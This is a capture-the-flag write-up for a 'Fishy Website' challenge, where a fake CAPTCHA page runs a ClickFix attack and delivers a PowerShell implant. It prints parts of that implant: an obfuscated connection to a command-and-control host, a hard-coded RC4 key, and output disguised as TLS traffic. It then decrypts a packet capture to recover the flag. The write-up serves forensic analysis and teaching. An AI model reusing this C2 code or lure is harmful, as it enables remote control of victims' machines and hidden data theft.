# Fishy Website — Writeup

**Category:** *misc*

## Initial access

A link to a webpage with a login form was provided. After attempting to log in, I was redirected to a page to "solve a CAPTHCA:

<p align="center">
<img src="../resources/DownUnderCTF 2025/Fishy1.png" alt="Captcha task"/>
</p>

This is a typical example of [ClickFix](https://www.group-ib.com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/) attack. The PowerShell cmdlet fetches additional data from the `../verify/script` endpoint, which contains a base64-encoded PowerShell script.

## Malware description

1. First, the malware connects to its C2 server using a `xor` encrypted IP address and port:

```PowerShell
$CLIENT = New-Object System.Net.Sockets.TcpClient

$CLIENT.Connect((Func1 -ARRAY_TO_FUNC @(5,7,25,2,25,3,15,25,5,7,7) -KEY 55), ((50 * 9) - (11 * 2)) + [math]::Pow(2, 3) + [math]::Sqrt(49))

$TCP_STREAM = $CLIENT.GetStream()
```
	Func1 decrypts the given array with key 55.

2. Next, the malware receives the RC4-encrypted commands from the server and decrypts them with the following key:

```PowerShell
$VAR1 = 0xf1,0x6e,0xcd,0xc6,0x79,0x4c,0x66,0xd1,0x02,0xf8,0x33,0xc4,0x86,0xe7,0xa4,0x35,0x8d,0x69,0xbd,0xd2,0x1d,0x50,0xf5,0xfb,0xdf,0xec,0xaf,0x0b,0x9e,0x53,0xa4,0xd3
```

3. The result of the command is encrypted with RC4 with the same key and appends extra bytes to the end:

```PowerShell
function Func3 {
	param ([string]$C2_COMMAND)
	$UTF-8_ENCODED_STR = [System.Text.Encoding]::UTF8.GetBytes($C2_COMMAND)
	$ARRAY_TO_FUNC = (Func2 -C2_KEY $VAR1 -C2_STRING $UTF-8_ENCODED_STR) + (0x02,0x04,0x06,0x08)
	$REVERSED_BYTES_ARRAY = [System.BitConverter]::GetBytes([int16]$ARRAY_TO_FUNC.Length)
	[Array]::Reverse($REVERSED_BYTES_ARRAY)
	return (0x17, 0x03, 0x03) + $REVERSED_BYTES_ARRAY + $ARRAY_TO_FUNC
}
```

## Solution

1.  A `.pcapng` file with captured traffic was provided.
2. I decrypted the C2 IP address from step 1 of the malware description:

<p align="center">
<img src="../resources/DownUnderCTF 2025/Fishy2.png" alt="Decrypted IP address"/>
</p>

3. I then filtered the traffic in the file using this IP address and found many TLS 1.3 encrypted packets:

<p align="center">
<img src="../resources/DownUnderCTF 2025/Fishy3.png" alt="Some of the encrypted packets"/>
</p>

4. I didn't find anything useful here, but I noticed that some data that was marked as encrypted in the packets has the tail with bytes from step 3 of the malware description:

<p align="center">
<img src="../resources/DownUnderCTF 2025/Fishy4.png" alt="The strange data"/>
</p>

5. So I tried to decrypt the data:

<p align="center">
<img src="../resources/DownUnderCTF 2025/Fishy5.png" alt="Decrypted data"/>
</p>

6. After that I started to look for the possible flag and found the next packet:

<p align="center">
<img src="../resources/DownUnderCTF 2025/Fishy6.png" alt="The possible flag packet"/>
</p>

7. I decrypted the data and got a base64-encoded string, which turned out to be the flag:

<p align="center">
<img src="../resources/DownUnderCTF 2025/Fishy7_0.png" alt="Decrypted bytes"/>
</p>
<p align="center">
<img src="../resources/DownUnderCTF 2025/Fishy7_1.png" alt="base64 string"/>
</p>
<p align="center">
<img src="../resources/DownUnderCTF 2025/Fishy7_2.png" alt="The flag"/>
</p>
